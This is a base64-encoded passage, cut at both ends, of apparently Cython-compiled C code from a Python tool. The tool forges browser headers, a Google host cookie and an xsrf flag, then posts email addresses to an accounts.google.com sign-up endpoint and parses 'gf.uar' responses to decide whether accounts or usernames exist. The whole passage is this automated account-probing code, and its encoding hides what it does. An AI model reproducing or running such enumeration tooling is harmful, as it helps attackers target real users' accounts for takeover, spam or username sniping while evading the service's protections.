JHVU1FTlRTX09GRlNFVCkpOwogICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMik7IF9fcHl4X3RfMTIgPSAwOwogICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF82KSkgX19QWVhfRVJSKDAsIDEzOSwgX19weXhfTDNfZXJyb3IpCiAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNik7CiAgICAgIH0KICAgICAgaWYgKChsaWtlbHkoUHlUdXBsZV9DaGVja0V4YWN0KF9fcHl4X3RfNikpKSB8fCAoUHlMaXN0X0NoZWNrRXhhY3QoX19weXhfdF82KSkpIHsKICAgICAgICBQeU9iamVjdCogc2VxdWVuY2UgPSBfX3B5eF90XzY7CiAgICAgICAgUHlfc3NpemVfdCBzaXplID0gX19QeXhfUHlTZXF1ZW5jZV9TSVpFKHNlcXVlbmNlKTsKICAgICAgICBpZiAodW5saWtlbHkoc2l6ZSAhPSAyKSkgewogICAgICAgICAgaWYgKHNpemUgPiAyKSBfX1B5eF9SYWlzZVRvb01hbnlWYWx1ZXNFcnJvcigyKTsKICAgICAgICAgIGVsc2UgaWYgKHNpemUgPj0gMCkgX19QeXhfUmFpc2VOZWVkTW9yZVZhbHVlc0Vycm9yKHNpemUpOwogICAgICAgICAgX19QWVhfRVJSKDAsIDEzOSwgX19weXhfTDNfZXJyb3IpCiAgICAgICAgfQogICAgICAgICNpZiBDWVRIT05fQVNTVU1FX1NBRkVfTUFDUk9TICYmICFDWVRIT05fQVZPSURfQk9SUk9XRURfUkVGUwogICAgICAgIGlmIChsaWtlbHkoUHlUdXBsZV9DaGVja0V4YWN0KHNlcXVlbmNlKSkpIHsKICAgICAgICAgIF9fcHl4X3RfMTIgPSBQeVR1cGxlX0dFVF9JVEVNKHNlcXVlbmNlLCAwKTsKICAgICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF90XzEyKTsKICAgICAgICAgIF9fcHl4X3RfNSA9IFB5VHVwbGVfR0VUX0lURU0oc2VxdWVuY2UsIDEpOwogICAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfNSk7CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgIF9fcHl4X3RfMTIgPSBfX1B5eF9QeUxpc3RfR2V0SXRlbVJlZihzZXF1ZW5jZSwgMCk7CiAgICAgICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTIpKSBfX1BZWF9FUlIoMCwgMTM5LCBfX3B5eF9MM19lcnJvcikKICAgICAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF8xMik7CiAgICAgICAgICBfX3B5eF90XzUgPSBfX1B5eF9QeUxpc3RfR2V0SXRlbVJlZihzZXF1ZW5jZSwgMSk7CiAgICAgICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfNSkpIF9fUFlYX0VSUigwLCAxMzksIF9fcHl4X0wzX2Vycm9yKQogICAgICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzUpOwogICAgICAgIH0KICAgICAgICAjZWxzZQogICAgICAgIF9fcHl4X3RfMTIgPSBfX1B5eF9QeVNlcXVlbmNlX0lURU0oc2VxdWVuY2UsIDApOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTIpKSBfX1BZWF9FUlIoMCwgMTM5LCBfX3B5eF9MM19lcnJvcikKICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xMik7CiAgICAgICAgX19weXhfdF81ID0gX19QeXhfUHlTZXF1ZW5jZV9JVEVNKHNlcXVlbmNlLCAxKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzUpKSBfX1BZWF9FUlIoMCwgMTM5LCBfX3B5eF9MM19lcnJvcikKICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF81KTsKICAgICAgICAjZW5kaWYKICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF82KTsgX19weXhfdF82ID0gMDsKICAgICAgfSBlbHNlIHsKICAgICAgICBQeV9zc2l6ZV90IGluZGV4ID0gLTE7CiAgICAgICAgX19weXhfdF8xMSA9IFB5T2JqZWN0X0dldEl0ZXIoX19weXhfdF82KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzExKSkgX19QWVhfRVJSKDAsIDEzOSwgX19weXhfTDNfZXJyb3IpCiAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMTEpOwogICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwOwogICAgICAgIF9fcHl4X3RfMjIgPSAoQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSSkgPyBQeUl0ZXJfTmV4dCA6IF9fUHl4X1B5T2JqZWN0X0dldEl0ZXJOZXh0RnVuYyhfX3B5eF90XzExKTsKICAgICAgICBpbmRleCA9IDA7IF9fcHl4X3RfMTIgPSBfX3B5eF90XzIyKF9fcHl4X3RfMTEpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTIpKSBnb3RvIF9fcHl4X0w1MF91bnBhY2tpbmdfZmFpbGVkOwogICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzEyKTsKICAgICAgICBpbmRleCA9IDE7IF9fcHl4X3RfNSA9IF9fcHl4X3RfMjIoX19weXhfdF8xMSk7IGlmICh1bmxpa2VseSghX19weXhfdF81KSkgZ290byBfX3B5eF9MNTBfdW5wYWNraW5nX2ZhaWxlZDsKICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF81KTsKICAgICAgICBpZiAoX19QeXhfSXRlcm5leHRVbnBhY2tFbmRDaGVjayhfX3B5eF90XzIyKF9fcHl4X3RfMTEpLCAyKSA8ICgwKSkgX19QWVhfRVJSKDAsIDEzOSwgX19weXhfTDNfZXJyb3IpCiAgICAgICAgX19weXhfdF8yMiA9IE5VTEw7CiAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTEpOyBfX3B5eF90XzExID0gMDsKICAgICAgICBnb3RvIF9fcHl4X0w1MV91bnBhY2tpbmdfZG9uZTsKICAgICAgICBfX3B5eF9MNTBfdW5wYWNraW5nX2ZhaWxlZDo7CiAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTEpOyBfX3B5eF90XzExID0gMDsKICAgICAgICBfX3B5eF90XzIyID0gTlVMTDsKICAgICAgICBpZiAoX19QeXhfSXRlckZpbmlzaCgpID09IDApIF9fUHl4X1JhaXNlTmVlZE1vcmVWYWx1ZXNFcnJvcihpbmRleCk7CiAgICAgICAgX19QWVhfRVJSKDAsIDEzOSwgX19weXhfTDNfZXJyb3IpCiAgICAgICAgX19weXhfTDUxX3VucGFja2luZ19kb25lOjsKICAgICAgfQogICAgICBfX3B5eF92X3RsID0gX19weXhfdF8xMjsKICAgICAgX19weXhfdF8xMiA9IDA7CiAgICAgIF9fcHl4X3ZfaG9zdCA9IF9fcHl4X3RfNTsKICAgICAgX19weXhfdF81ID0gMDsKCiAgICAgIAogICAgICBfX3B5eF90XzYgPSBfX1B5eF9QeURpY3RfTmV3UHJlc2l6ZWQoMSk7IGlmICh1bmxpa2VseSghX19weXhfdF82KSkgX19QWVhfRVJSKDAsIDE0MCwgX19weXhfTDNfZXJyb3IpCiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzYpOwogICAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfdF82LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X0hvc3RfR0FQUywgX19weXhfdl9ob3N0KSA8ICgwKSkgX19QWVhfRVJSKDAsIDE0MCwgX19weXhfTDNfZXJyb3IpCiAgICAgIF9fcHl4X3ZfY29va2llcyA9ICgoUHlPYmplY3QqKV9fcHl4X3RfNik7CiAgICAgIF9fcHl4X3RfNiA9IDA7CgogICAgICAKICAgICAgX19weXhfdF82ID0gX19QeXhfUHlEaWN0X05ld1ByZXNpemVkKDgpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNikpIF9fUFlYX0VSUigwLCAxNDIsIF9fcHl4X0wzX2Vycm9yKQogICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF82KTsKICAgICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfNiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2F1dGhvcml0eSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9hY2NvdW50c19nb29nbGVfY29tKSA8ICgwKSkgX19QWVhfRVJSKDAsIDE0MiwgX19weXhfTDNfZXJyb3IpCiAgICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzYsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9hY2NlcHQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfXzIpIDwgKDApKSBfX1BZWF9FUlIoMCwgMTQyLCBfX3B5eF9MM19lcnJvcikKICAgICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfNiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9hY2NlcHRfbGFuZ3VhZ2UsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfZW5fVVNfZW5fcV8wXzkpIDwgKDApKSBfX1BZWF9FUlIoMCwgMTQyLCBfX3B5eF9MM19lcnJvcikKICAgICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfNiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9jb250ZW50X3R5cGUsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfYXBwbGljYXRpb25feF93d3dfZm9ybV91cmxlbmNvZGUpIDwgKDApKSBfX1BZWF9FUlIoMCwgMTQyLCBfX3B5eF9MM19lcnJvcikKICAgICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfNiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9nb29nbGVfYWNjb3VudHNfeHNyZiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV8xKSA8ICgwKSkgX19QWVhfRVJSKDAsIDE0MiwgX19weXhfTDNfZXJyb3IpCiAgICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzYsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9vcmlnaW4sIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfaHR0cHNfYWNjb3VudHNfZ29vZ2xlX2NvbSkgPCAoMCkpIF9fUFlYX0VSUigwLCAxNDIsIF9fcHl4X0wzX2Vycm9yKQoKICAgICAgCiAgICAgIF9fcHl4X3RfNSA9IF9fUHl4X1B5T2JqZWN0X0Zvcm1hdFNpbXBsZShfX3B5eF92X3RsLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9lbXB0eV91bmljb2RlKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzUpKSBfX1BZWF9FUlIoMCwgMTQ4LCBfX3B5eF9MM19lcnJvcikKICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNSk7CiAgICAgIF9fcHl4X3RfMTIgPSBfX1B5eF9QeVVuaWNvZGVfQ29uY2F0KF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfaHR0cHNfYWNjb3VudHNfZ29vZ2xlX2NvbV9zaWdudXBfMiwgX19weXhfdF81KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEyKSkgX19QWVhfRVJSKDAsIDE0OCwgX19weXhfTDNfZXJyb3IpCiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzEyKTsKICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7CiAgICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzYsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9yZWZlcmVyLCBfX3B5eF90XzEyKSA8ICgwKSkgX19QWVhfRVJSKDAsIDE0MiwgX19weXhfTDNfZXJyb3IpCiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEyKTsgX19weXhfdF8xMiA9IDA7CgogICAgICAKICAgICAgX19weXhfdF81ID0gTlVMTDsKICAgICAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzExLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZ2diKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzExKSkgX19QWVhfRVJSKDAsIDE0OSwgX19weXhfTDNfZXJyb3IpCiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzExKTsKICAgICAgX19weXhfdF8xMyA9IDE7CiAgICAgICNpZiBDWVRIT05fVU5QQUNLX01FVEhPRFMKICAgICAgaWYgKHVubGlrZWx5KFB5TWV0aG9kX0NoZWNrKF9fcHl4X3RfMTEpKSkgewogICAgICAgIF9fcHl4X3RfNSA9IFB5TWV0aG9kX0dFVF9TRUxGKF9fcHl4X3RfMTEpOwogICAgICAgIGFzc2VydChfX3B5eF90XzUpOwogICAgICAgIFB5T2JqZWN0KiBfX3B5eF9fZnVuY3Rpb24gPSBQeU1ldGhvZF9HRVRfRlVOQ1RJT04oX19weXhfdF8xMSk7CiAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfNSk7CiAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X19mdW5jdGlvbik7CiAgICAgICAgX19QeXhfREVDUkVGX1NFVChfX3B5eF90XzExLCBfX3B5eF9fZnVuY3Rpb24pOwogICAgICAgIF9fcHl4X3RfMTMgPSAwOwogICAgICB9CiAgICAgICNlbmRpZgogICAgICB7CiAgICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfNSwgTlVMTH07CiAgICAgICAgX19weXhfdF8xMiA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsKF9fcHl4X3RfMTEsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfMTMsICgxLV9fcHl4X3RfMTMpIHwgKF9fcHl4X3RfMTMqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7CiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwOwogICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzExKTsgX19weXhfdF8xMSA9IDA7CiAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEyKSkgX19QWVhfRVJSKDAsIDE0OSwgX19weXhfTDNfZXJyb3IpCiAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMTIpOwogICAgICB9CiAgICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzYsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfdXNlcl9hZ2VudCwgX19weXhfdF8xMikgPCAoMCkpIF9fUFlYX0VSUigwLCAxNDIsIF9fcHl4X0wzX2Vycm9yKQogICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xMik7IF9fcHl4X3RfMTIgPSAwOwogICAgICBfX3B5eF92X2hlYWRlcnMgPSAoKFB5T2JqZWN0KilfX3B5eF90XzYpOwogICAgICBfX3B5eF90XzYgPSAwOwoKICAgICAgCiAgICAgIF9fcHl4X3RfNiA9IF9fUHl4X1B5RGljdF9OZXdQcmVzaXplZCgxKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzYpKSBfX1BZWF9FUlIoMCwgMTUxLCBfX3B5eF9MM19lcnJvcikKICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNik7CiAgICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzYsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9UTCwgX19weXhfdl90bCkgPCAoMCkpIF9fUFlYX0VSUigwLCAxNTEsIF9fcHl4X0wzX2Vycm9yKQogICAgICBfX3B5eF92X3BhcmFtcyA9ICgoUHlPYmplY3QqKV9fcHl4X3RfNik7CiAgICAgIF9fcHl4X3RfNiA9IDA7CgogICAgICAKICAgICAgX19weXhfdF82ID0gX19QeXhfUHlPYmplY3RfRm9ybWF0U2ltcGxlKF9fcHl4X3ZfdGwsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2VtcHR5X3VuaWNvZGUpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNikpIF9fUFlYX0VSUigwLCAxNTIsIF9fcHl4X0wzX2Vycm9yKQogICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF82KTsKICAgICAgX19weXhfdF8xMiA9IF9fUHl4X1B5T2JqZWN0X0Zvcm1hdFNpbXBsZShfX3B5eF92X2VtYWlsLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9lbXB0eV91bmljb2RlKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEyKSkgX19QWVhfRVJSKDAsIDE1MiwgX19weXhfTDNfZXJyb3IpCiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzEyKTsKICAgICAgX19weXhfdF8yM1swXSA9IF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfY29udGludWVfaHR0cHNfM0FfMkZfMkZtYWlsX2dvb2c7CiAgICAgIF9fcHl4X3RfMjNbMV0gPSBfX3B5eF90XzY7CiAgICAgIF9fcHl4X3RfMjNbMl0gPSBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91XzIyXzJDXzIyOwogICAgICBfX3B5eF90XzIzWzNdID0gX19weXhfdF8xMjsKICAgICAgX19weXhfdF8yM1s0XSA9IF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfMjJfMkMwXzJDMF8yQzFfMkNudWxsXzJDMF8yQzUxNjsKICAgICAgX19weXhfdF8xMSA9IF9fUHl4X1B5VW5pY29kZV9Kb2luKF9fcHl4X3RfMjMsIDUsIDExOSArIF9fUHl4X1B5VW5pY29kZV9HRVRfTEVOR1RIKF9fcHl4X3RfNikgKyA5ICsgX19QeXhfUHlVbmljb2RlX0dFVF9MRU5HVEgoX19weXhfdF8xMikgKyAzNjAsIDEyNyB8IF9fUHl4X1B5VW5pY29kZV9NQVhfQ0hBUl9WQUxVRShfX3B5eF90XzYpIHwgX19QeXhfUHlVbmljb2RlX01BWF9DSEFSX1ZBTFVFKF9fcHl4X3RfMTIpKTsKICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzExKSkgX19QWVhfRVJSKDAsIDE1MiwgX19weXhfTDNfZXJyb3IpCiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzExKTsKICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNik7IF9fcHl4X3RfNiA9IDA7CiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEyKTsgX19weXhfdF8xMiA9IDA7CiAgICAgIF9fcHl4X3ZfZGF0YSA9ICgoUHlPYmplY3QqKV9fcHl4X3RfMTEpOwogICAgICBfX3B5eF90XzExID0gMDsKCiAgICAgIAogICAgICBfX3B5eF90XzEyID0gTlVMTDsKICAgICAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzYsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9yZXF1ZXN0cyk7IGlmICh1bmxpa2VseSghX19weXhfdF82KSkgX19QWVhfRVJSKDAsIDE1MywgX19weXhfTDNfZXJyb3IpCiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzYpOwogICAgICBfX3B5eF90XzUgPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyKF9fcHl4X3RfNiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3Bvc3QpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNSkpIF9fUFlYX0VSUigwLCAxNTMsIF9fcHl4X0wzX2Vycm9yKQogICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF81KTsKICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNik7IF9fcHl4X3RfNiA9IDA7CgogICAgICAKICAgICAgX19weXhfdF8xMyA9IDE7CiAgICAgICNpZiBDWVRIT05fVU5QQUNLX01FVEhPRFMKICAgICAgaWYgKHVubGlrZWx5KFB5TWV0aG9kX0NoZWNrKF9fcHl4X3RfNSkpKSB7CiAgICAgICAgX19weXhfdF8xMiA9IFB5TWV0aG9kX0dFVF9TRUxGKF9fcHl4X3RfNSk7CiAgICAgICAgYXNzZXJ0KF9fcHl4X3RfMTIpOwogICAgICAgIFB5T2JqZWN0KiBfX3B5eF9fZnVuY3Rpb24gPSBQeU1ldGhvZF9HRVRfRlVOQ1RJT04oX19weXhfdF81KTsKICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfdF8xMik7CiAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X19mdW5jdGlvbik7CiAgICAgICAgX19QeXhfREVDUkVGX1NFVChfX3B5eF90XzUsIF9fcHl4X19mdW5jdGlvbik7CiAgICAgICAgX19weXhfdF8xMyA9IDA7CiAgICAgIH0KICAgICAgI2VuZGlmCiAgICAgIHsKICAgICAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMiArICgoQ1lUSE9OX1ZFQ1RPUkNBTEwpID8gNCA6IDApXSA9IHtfX3B5eF90XzEyLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X2h0dHBzX2FjY291bnRzX2dvb2dsZV9jb21fX19zaWduXzJ9OwogICAgICAgIF9fcHl4X3RfNiA9IF9fUHl4X01ha2VWZWN0b3JjYWxsQnVpbGRlckt3ZHMoNCk7IGlmICh1bmxpa2VseSghX19weXhfdF82KSkgX19QWVhfRVJSKDAsIDE1MywgX19weXhfTDNfZXJyb3IpCiAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNik7CiAgICAgICAgaWYgKF9fUHl4X1ZlY3RvcmNhbGxCdWlsZGVyX0FkZEFyZyhfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfcGFyYW1zLCBfX3B5eF92X3BhcmFtcywgX19weXhfdF82LCBfX3B5eF9jYWxsYXJncysyLCAwKSA8ICgwKSkgX19QWVhfRVJSKDAsIDE1MywgX19weXhfTDNfZXJyb3IpCiAgICAgICAgaWYgKF9fUHl4X1ZlY3RvcmNhbGxCdWlsZGVyX0FkZEFyZyhfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfY29va2llcywgX19weXhfdl9jb29raWVzLCBfX3B5eF90XzYsIF9fcHl4X2NhbGxhcmdzKzIsIDEpIDwgKDApKSBfX1BZWF9FUlIoMCwgMTUzLCBfX3B5eF9MM19lcnJvcikKICAgICAgICBpZiAoX19QeXhfVmVjdG9yY2FsbEJ1aWxkZXJfQWRkQXJnKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9oZWFkZXJzLCBfX3B5eF92X2hlYWRlcnMsIF9fcHl4X3RfNiwgX19weXhfY2FsbGFyZ3MrMiwgMikgPCAoMCkpIF9fUFlYX0VSUigwLCAxNTMsIF9fcHl4X0wzX2Vycm9yKQogICAgICAgIGlmIChfX1B5eF9WZWN0b3JjYWxsQnVpbGRlcl9BZGRBcmcoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2RhdGEsIF9fcHl4X3ZfZGF0YSwgX19weXhfdF82LCBfX3B5eF9jYWxsYXJncysyLCAzKSA8ICgwKSkgX19QWVhfRVJSKDAsIDE1MywgX19weXhfTDNfZXJyb3IpCiAgICAgICAgX19weXhfdF8xMSA9IF9fUHl4X09iamVjdF9WZWN0b3JjYWxsX0NhbGxGcm9tQnVpbGRlcihfX3B5eF90XzUsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfMTMsICgyLV9fcHl4X3RfMTMpIHwgKF9fcHl4X3RfMTMqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSwgX19weXhfdF82KTsKICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTIpOyBfX3B5eF90XzEyID0gMDsKICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF82KTsgX19weXhfdF82ID0gMDsKICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDsKICAgICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTEpKSBfX1BZWF9FUlIoMCwgMTUzLCBfX3B5eF9MM19lcnJvcikKICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xMSk7CiAgICAgIH0KICAgICAgX19weXhfdl9yZXNwb25zZSA9IF9fcHl4X3RfMTE7CiAgICAgIF9fcHl4X3RfMTEgPSAwOwoKICAgICAgCiAgICAgIF9fcHl4X3RfMTEgPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyKF9fcHl4X3ZfcmVzcG9uc2UsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV90ZXh0KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzExKSkgX19QWVhfRVJSKDAsIDE1NiwgX19weXhfTDNfZXJyb3IpCiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzExKTsKICAgICAgX19weXhfdF81ID0gX19QeXhfUHlPYmplY3RfVW5pY29kZShfX3B5eF90XzExKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzUpKSBfX1BZWF9FUlIoMCwgMTU2LCBfX3B5eF9MM19lcnJvcikKICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNSk7CiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzExKTsgX19weXhfdF8xMSA9IDA7CiAgICAgIF9fcHl4X3RfNCA9IChfX1B5eF9QeVVuaWNvZGVfQ29udGFpbnNURihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X2dmX3Vhcl8xLCBfX3B5eF90XzUsIFB5X0VRKSk7IGlmICh1bmxpa2VseSgoX19weXhfdF80IDwgMCkpKSBfX1BZWF9FUlIoMCwgMTU2LCBfX3B5eF9MM19lcnJvcikKICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7CiAgICAgIGlmIChfX3B5eF90XzQpIHsKCiAgICAgICAgCiAgICAgICAgX19weXhfdF80ID0gKF9fUHl4X1B5U2VxdWVuY2VfQ29udGFpbnNURihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X183LCBfX3B5eF92X29yaWdpbmFsX2VtYWlsLCBQeV9FUSkpOyBpZiAodW5saWtlbHkoKF9fcHl4X3RfNCA8IDApKSkgX19QWVhfRVJSKDAsIDE1OCwgX19weXhfTDNfZXJyb3IpCiAgICAgICAgaWYgKF9fcHl4X3RfNCkgewoKICAgICAgICAgIAogICAgICAgICAgX19weXhfdF82ID0gX19weXhfdl9vcmlnaW5hbF9lbWFpbDsKICAgICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF90XzYpOwogICAgICAgICAgX19weXhfdF8xMyA9IDA7CiAgICAgICAgICB7CiAgICAgICAgICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syXSA9IHtfX3B5eF90XzYsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfXzd9OwogICAgICAgICAgICBfX3B5eF90XzExID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGxNZXRob2QoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3NwbGl0LCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzEzLCAoMi1fX3B5eF90XzEzKSB8ICgxKl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpOwogICAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNik7IF9fcHl4X3RfNiA9IDA7CiAgICAgICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF8xMSkpIF9fUFlYX0VSUigwLCAxNTcsIF9fcHl4X0wzX2Vycm9yKQogICAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xMSk7CiAgICAgICAgICB9CgogICAgICAgICAgCiAgICAgICAgICBfX3B5eF90XzYgPSBfX1B5eF9HZXRJdGVtSW50KF9fcHl4X3RfMTEsIDAsIGxvbmcsIDEsIF9fUHl4X1B5TG9uZ19Gcm9tX2xvbmcsIDAsIDAsIDEsIDEpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNikpIF9fUFlYX0VSUigwLCAxNTgsIF9fcHl4X0wzX2Vycm9yKQogICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNik7CiAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xMSk7IF9fcHl4X3RfMTEgPSAwOwogICAgICAgICAgX19weXhfdF81ID0gX19weXhfdF82OwogICAgICAgICAgX19weXhfdF82ID0gMDsKICAgICAgICB9IGVsc2UgewogICAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X3Zfb3JpZ2luYWxfZW1haWwpOwogICAgICAgICAgX19weXhfdF81ID0gX19weXhfdl9vcmlnaW5hbF9lbWFpbDsKICAgICAgICB9CiAgICAgICAgX19weXhfdl91c2VybmFtZSA9IF9fcHl4X3RfNTsKICAgICAgICBfX3B5eF90XzUgPSAwOwo